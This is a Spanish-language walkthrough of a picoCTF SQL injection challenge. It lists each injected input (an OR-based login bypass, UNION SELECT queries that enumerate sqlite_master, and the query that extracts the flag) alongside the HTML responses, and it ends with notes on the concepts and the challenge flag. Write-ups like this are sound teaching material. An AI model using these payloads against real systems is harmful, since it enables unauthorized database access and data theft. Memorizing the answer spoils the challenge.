**Reto**
	
**Descripción**
	Can you find the flag on this website.Try to find the flag [here](http://saturn.picoctf.net:59574/).

**Solución**
	1. Usando el navegador Mozilla Firefox, realizando inyección SQL (SQL Injection).
		Paso 1: Ingresar claves para ver que tipo de sql es
			<html><head><link rel="stylesheet" href="chrome-extension://ihcjicgdanjaechkgeegckofjjedodee/app/content-style.css"></head><body><pre>username: admin
			password: lab-password
			SQL query: SELECT id FROM users WHERE password = 'lab-password' AND username = 'admin'
			</pre></body></html>
/
		Siguiente paso: Ingresar con inyeccion sql (' or 1 = = 1; o ' or 1 = = 1--)
			<html lang="en"><head>
					<meta charset="utf-8">
					<meta http-equiv="X-UA-Compatible" content="IE=edge">
					<meta name="viewport" content="width=device-width, initial-scale=1">
					<title>picoCTF SQLi Challenge</title>
					<link rel="stylesheet" type="text/css" href="css/style.css">
					<!-- Bootstrap -->
					<link href="css/bootstrap.min.css" rel="stylesheet">
					<script src="https://ajax.googleapis.com/ajax/libs/jquery/1.12.4/jquery.min.js"></script>
					<script src="js/bootstrap.min.js"></script>
				<link rel="stylesheet" href="chrome-extension://ihcjicgdanjaechkgeegckofjjedodee/app/content-style.css"></head>
				<body>
					<div class="container">
						<h1>Welcome</h1>
						<a href="logout.php"><button type="button" class="btn btn-primary">Log Out</button></a>
						<h3>Search Office</h3> 
						<form method="post" action="" class="form-search">
							<div class="row">
								<div class="col-xs-12 col-sm-6 col-md-4">
									<div class="input-group">
										<input type="text" class="form-control" name="search" id="searchInput" placeholder="City" autofocus="">
										<span class="input-group-btn">
											<input type="submit" name="submit" value="Search" class="btn btn-primary">
										</span>
									</div>
								</div>
							</div>
						</form>
						<div class="well col-xs-12 col-sm-6">
							<div class="table-responsive">
								<table class="table table-striped">
									<thead>
										<tr>
											<th>City</th>
											<th>Address</th>
											<th>Phone</th>
										</tr>
									</thead>
									<tbody>
									<tr><td>Algiers</td><td>Birger Jarlsgatan 7, 4 tr</td><td>+246 8-616 99 40</td></tr><tr><td>Bamako</td><td>Friedrichstraße 68</td><td>+249 173 329 6295</td></tr><tr><td>Nairobi</td><td>Ferdinandstraße 35</td><td>+254 703 039 810</td></tr><tr><td>Kampala</td><td>Maybe all the tables</td><td>+256 720 7705600</td></tr><tr><td>Kigali</td><td>8 Ganton Street</td><td>+250 7469 214 950</td></tr><tr><td>Kinshasa</td><td>Sternstraße 5</td><td>+249 89 885 627 88</td></tr><tr><td>Lagos</td><td>Karl Johans gate 23B, 4. etasje</td><td>+234 224 25 150</td></tr><tr><td>Pretoria</td><td>149 Rue Saint-Honoré</td><td>+233 635 46 15 03</td></tr>						</tbody>
								</table>
							</div>
						</div>
					</div>
				</body></html>
/
		Siguiente paso: ' UNION SELECT sqlite_version(),2,3--
			<html lang="en"><head>
				<meta charset="utf-8">
				<meta http-equiv="X-UA-Compatible" content="IE=edge">
				<meta name="viewport" content="width=device-width, initial-scale=1">
				<title>picoCTF SQLi Challenge</title>
				<link rel="stylesheet" type="text/css" href="css/style.css">
				<!-- Bootstrap -->
				<link href="css/bootstrap.min.css" rel="stylesheet">
				<script src="https://ajax.googleapis.com/ajax/libs/jquery/1.12.4/jquery.min.js"></script>
				<script src="js/bootstrap.min.js"></script>
			<link rel="stylesheet" href="chrome-extension://ihcjicgdanjaechkgeegckofjjedodee/app/content-style.css"></head>
			<body>
				<div class="container">
					<h1>Welcome</h1>
					<a href="logout.php"><button type="button" class="btn btn-primary">Log Out</button></a>
					<h3>Search Office</h3> 
					<form method="post" action="" class="form-search">
						<div class="row">
							<div class="col-xs-12 col-sm-6 col-md-4">
								<div class="input-group">
									<input type="text" class="form-control" name="search" id="searchInput" placeholder="City" autofocus="">
									<span class="input-group-btn">
										<input type="submit" name="submit" value="Search" class="btn btn-primary">
									</span>
								</div>
							</div>
						</div>
					</form>
					<div class="well col-xs-12 col-sm-6">
						<div class="table-responsive">
							<table class="table table-striped">
								<thead>
									<tr>
										<th>City</th>
										<th>Address</th>
										<th>Phone</th>
									</tr>
								</thead>
								<tbody>
								<tr><td>3.31.1</td><td>2</td><td>3</td></tr>						</tbody>
							</table>
						</div>
					</div>
				</div>
			</body></html>
/
		Siguiente paso: ' union select sql,2,3 from sqlite_master;
			<html lang="en"><head>
				<meta charset="utf-8">
				<meta http-equiv="X-UA-Compatible" content="IE=edge">
				<meta name="viewport" content="width=device-width, initial-scale=1">
				<title>picoCTF SQLi Challenge</title>
				<link rel="stylesheet" type="text/css" href="css/style.css">
				<!-- Bootstrap -->
				<link href="css/bootstrap.min.css" rel="stylesheet">
				<script src="https://ajax.googleapis.com/ajax/libs/jquery/1.12.4/jquery.min.js"></script>
				<script src="js/bootstrap.min.js"></script>
			<link rel="stylesheet" href="chrome-extension://ihcjicgdanjaechkgeegckofjjedodee/app/content-style.css"></head>
			<body>
				<div class="container">
					<h1>Welcome</h1>
					<a href="logout.php"><button type="button" class="btn btn-primary">Log Out</button></a>
					<h3>Search Office</h3> 
					<form method="post" action="" class="form-search">
						<div class="row">
							<div class="col-xs-12 col-sm-6 col-md-4">
								<div class="input-group">
									<input type="text" class="form-control" name="search" id="searchInput" placeholder="City" autofocus="">
									<span class="input-group-btn">
										<input type="submit" name="submit" value="Search" class="btn btn-primary">
									</span>
								</div>
							</div>
						</div>
					</form>
					<div class="well col-xs-12 col-sm-6">
						<div class="table-responsive">
							<table class="table table-striped">
								<thead>
									<tr>
										<th>City</th>
										<th>Address</th>
										<th>Phone</th>
									</tr>
								</thead>
								<tbody>
								<tr><td></td><td>2</td><td>3</td></tr><tr><td>CREATE TABLE hints (id INTEGER NOT NULL PRIMARY KEY, info TEXT)</td><td>2</td><td>3</td></tr><tr><td>CREATE TABLE more_table (id INTEGER NOT NULL PRIMARY KEY, flag TEXT)</td><td>2</td><td>3</td></tr><tr><td>CREATE TABLE offices (id INTEGER NOT NULL PRIMARY KEY, city TEXT, address TEXT, phone TEXT)</td><td>2</td><td>3</td></tr><tr><td>CREATE TABLE users (name TEXT NOT NULL PRIMARY KEY, password TEXT, id INTEGER)</td><td>2</td><td>3</td></tr>						</tbody>
							</table>
						</div>
					</div>
				</div>
			</body></html>
/
		Siguiente paso:	' UNION SELECT 1,flag,3 FROM more_table--
			<html lang="en"><head>
					<meta charset="utf-8">
					<meta http-equiv="X-UA-Compatible" content="IE=edge">
					<meta name="viewport" content="width=device-width, initial-scale=1">
					<title>picoCTF SQLi Challenge</title>
					<link rel="stylesheet" type="text/css" href="css/style.css">
					<!-- Bootstrap -->
					<link href="css/bootstrap.min.css" rel="stylesheet">
					<script src="https://ajax.googleapis.com/ajax/libs/jquery/1.12.4/jquery.min.js"></script>
					<script src="js/bootstrap.min.js"></script>
				<link rel="stylesheet" href="chrome-extension://ihcjicgdanjaechkgeegckofjjedodee/app/content-style.css"></head>
				<body>
					<div class="container">
						<h1>Welcome</h1>
						<a href="logout.php"><button type="button" class="btn btn-primary">Log Out</button></a>
						<h3>Search Office</h3> 
						<form method="post" action="" class="form-search">
							<div class="row">
								<div class="col-xs-12 col-sm-6 col-md-4">
									<div class="input-group">
										<input type="text" class="form-control" name="search" id="searchInput" placeholder="City" autofocus="">
										<span class="input-group-btn">
											<input type="submit" name="submit" value="Search" class="btn btn-primary">
										</span>
									</div>
								</div>
							</div>
						</form>
						<div class="well col-xs-12 col-sm-6">
							<div class="table-responsive">
								<table class="table table-striped">
									<thead>
										<tr>
											<th>City</th>
											<th>Address</th>
											<th>Phone</th>
										</tr>
									</thead>
									<tbody>
									<tr><td>1</td><td>If you are here, you must have seen it</td><td>3</td></tr><tr><td>1</td><td>picoCTF{G3tting_5QL_1nJ3c7I0N_l1k3_y0u_sh0ulD_62aa7500}</td><td>3</td></tr>						</tbody>
								</table>
							</div>
						</div>
					</div>
			</body></html>

**Notes**
	1. El reto consiste en explotar una vulnerabilidad de SQL Injection dentro de un campo de búsqueda después del inicio de sesión.
	2. Inicialmente se ingresaron credenciales de prueba para observar la consulta SQL generada por la aplicación.
	3. Se identificó la consulta:
		SELECT id FROM users WHERE password = 'lab-password' AND username = 'admin'
	4. Se confirmó la vulnerabilidad utilizando un bypass de autenticación con:
		  `'or 1 = = 1--` o `' or 1 = = 1;`
	5. Una vez dentro del sistema, el campo "Search Office" también resultó vulnerable a SQL Injection.
	6. Se determinó el número de columnas de la consulta mediante pruebas con UNION SELECT.
	7. Se verificó que la consulta contenía 3 columnas usando:
		`' UNION SELECT sqlite_version(),2,3--`
	8. Se confirmó que la base de datos utilizada era SQLite al obtener su versión (3.31.1).
	9. Posteriormente se enumeraron las tablas existentes usando:
		`' UNION SELECT sql,2,3 FROM sqlite_master--`
	10. Se identificaron tablas relevantes:
	    - hints
	    - more_table
	    - offices
	    - users
	11. La tabla more_table contenía un campo llamado flag.
	12. Finalmente se extrajo la bandera mediante:
	    `' UNION SELECT 1,flag,3 FROM more_table--`
	13. Tipo de vulnerabilidad explotada:
	    - SQL Injection (UNION-based)
	    - Information Disclosure
	14. Conceptos clave:
	    14.1. `sqlite_master` almacena la estructura de la base de datos en SQLite.
	    14.2. `UNION SELECT` permite combinar resultados de consultas arbitrarias.
	    14.3. Es necesario que el número de columnas coincida para usar UNION.
	    14.4. La enumeración de tablas es un paso fundamental antes de extraer datos sensibles.
	    14.5. SQL Injection puede permitir lectura completa de la base de datos.

**Referencias**
	